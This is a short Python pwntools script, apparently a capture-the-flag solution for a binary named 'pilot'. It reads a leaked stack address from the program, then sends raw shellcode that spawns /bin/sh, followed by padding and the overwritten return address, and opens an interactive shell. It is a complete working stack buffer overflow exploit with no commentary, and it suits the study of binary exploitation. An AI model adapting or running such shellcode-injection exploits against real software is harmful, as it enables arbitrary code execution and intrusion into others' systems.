#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./pilot")

p = process("./pilot")

# gdb.attach(p)

p.recvuntil("Location:0x")
input_loc = int(p.recvline().strip().ljust(8, b'\x00'), 16)

log.info(f'{input_loc=}')

#input_loc = 0x7fffffffdc70

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
padding = b'a'*(0x28-len(shellcode))

log.info(f"{len(padding)=}")

payload = shellcode + padding + p64(input_loc)

p.recvuntil("mmand:")
p.sendline(payload)

p.interactive()
